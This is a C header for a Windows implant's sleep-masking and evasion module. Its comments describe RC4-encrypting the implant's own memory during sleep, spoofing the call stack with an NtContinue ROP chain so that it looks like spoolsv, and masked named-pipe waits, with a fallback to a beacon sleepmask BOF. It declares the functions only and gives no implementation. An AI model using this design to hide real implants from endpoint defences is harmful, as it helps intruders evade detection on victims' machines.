#pragma once

#include <windows.h>

/* Phase 1 Gen3 sleep chain (evasion-research branch).
 *
 * gen3_sleep(time) replaces the sleep window with:
 *   1a. RC4 (SystemFunction032) encryption of every own-table section range
 *       plus every tracked heap block, with a per-cycle rotated key that
 *       lives on the stack (outside all masked ranges);
 *   1b. callstack spoofing for the whole window - a timer queue ROP chain
 *       (NtContinue x4, CallStackMasker port) backs up the real stack,
 *       overwrites it with a static spoolsv waiting shape, restores it
 *       right before wake, and signals the event the main thread waits on.
 *
 * Returns TRUE if the sleep was served. On any failure GargleSleep falls
 * back to the official sleepmask-BOF path. x64 only; x86 compiles empty.
 */
BOOL gen3_sleep(DWORD time);

/* snapshot accessor for the BOF-window engine: fills out[] with the same
 * block list gen3_sleep masks (header page + writable non-.text sections +
 * tracked heap, g3 dedup rules) and, when text_span is non-NULL, writes the
 * [RVA, RVA+size) of the first .text section into it. x86: returns 0. */
typedef struct {
	unsigned char * ptr;
	unsigned long   len;
} G3_HEADER_BLOCK;

int g3_snapshot_for_bofwin(G3_HEADER_BLOCK * out, int max, DWORD * text_span);

/* Phase 2 wait-window: masked blocking wait for the pipe channels. Masks
 * every gen3 block, calls ConnectNamedPipe through a pre-resolved pointer
 * (no API between mask and unmask), unmasks, returns TRUE when the wait
 * was served masked (connection established or already connected). No
 * timers - immune to CFG hosts and indefinite by construction. Returns
 * FALSE (caller falls back to the unmasked plan-B wait) when the engine
 * is unavailable. x86: always FALSE. */
BOOL gen3_wait_pipe(HANDLE pipe);

/* bisect/acceptance tracing (rounds 12-17): define G3_TRACE to compile the
 * file-logging probes back in; production builds compile them out. */
#if defined(G3_TRACE)
void g3_log(const char * msg, long v);
#else
#define g3_log(msg, v) ((void)0)
#endif
